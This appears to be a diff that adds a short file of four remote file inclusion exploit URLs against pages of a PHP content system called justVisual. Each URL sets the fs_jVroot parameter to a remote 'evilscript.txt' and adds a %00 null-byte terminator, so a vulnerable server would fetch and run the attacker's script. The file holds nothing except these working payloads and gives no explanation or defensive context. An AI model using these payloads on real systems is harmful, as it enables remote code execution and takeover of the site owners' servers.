@@ -1,0 +1,5 @@
+http://www.example.com/justVisual/sites/site/pages/index.php?fs_jVroot=http://www.example.com/evilscript.txt%00
+http://www.example.com/justVisual/sites/test/pages/contact.php?fs_jVroot=http://www.example.com/evilscript.txt%00
+http://www.example.com/justVisual/system/pageTemplate.php?fs_jVroot=http://www.example.com/evilscript.txt%00
+http://www.example.com/justVisual/system/utilities.php?fs_jVroot=http://www.example.com/evilscript.txt%00
+
